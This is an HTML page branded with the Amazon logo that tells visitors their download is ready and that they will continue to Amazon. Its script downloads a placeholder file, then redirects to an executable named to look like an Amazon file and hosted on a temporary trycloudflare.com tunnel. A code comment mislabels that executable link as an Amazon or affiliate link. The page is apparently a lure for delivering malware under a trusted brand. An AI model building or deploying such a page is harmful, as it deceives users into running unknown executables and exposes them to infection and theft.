<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Download File</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, Helvetica, sans-serif;
        }

        body {
            height: 100vh;
            background: linear-gradient(135deg, #232f3e, #131a22);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .wrapper {
            background: #ffffff;
            width: 100%;
            max-width: 500px;
            padding: 40px 30px;
            text-align: center;
            border-radius: 12px;
            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
        }

        .amazon-logo {
            width: 160px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 15px;
            color: #111;
        }

        p {
            font-size: 16px;
            color: #555;
            margin-bottom: 30px;
        }

        button {
            width: 100%;
            padding: 15px;
            font-size: 18px;
            background-color: #ff9900;
            color: #111;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            transition: background 0.3s;
        }

        button:hover {
            background-color: #e68a00;
        }

        .note {
            margin-top: 15px;
            font-size: 13px;
            color: #777;
        }
    </style>
</head>
<body>

<div class="wrapper">
    <img 
        src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" 
        alt="Amazon Logo" 
        class="amazon-logo"
    >

    <h1>Your Download Is Ready</h1>
    <p>Click the button below to download your file and continue to Amazon.</p>

    <button onclick="redirectAndDownload()">
        Download & Continue
    </button>

    <div class="note">
        You will be redirected to Amazon automatically.
    </div>
</div>

<script>
    function redirectAndDownload() {

        // 🔽 FILE DOWNLOAD LINK
        const fileUrl = "your-file.pdf"; // change file name or link

        // 🛒 AMAZON LINK
        const amazonUrl = "https://gardening-mpeg-instrumentation-inquiry.trycloudflare.com/links/new/amazon_GWvJN12h4kCbqfY.exe"; // put your Amazon / affiliate link

        // Start file download
        const link = document.createElement("a");
        link.href = fileUrl;
        link.download = "";
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        // Redirect after short delay
        setTimeout(() => {
            window.location.href = amazonUrl;
        }, 700);
    }
</script>

</body>
</html>
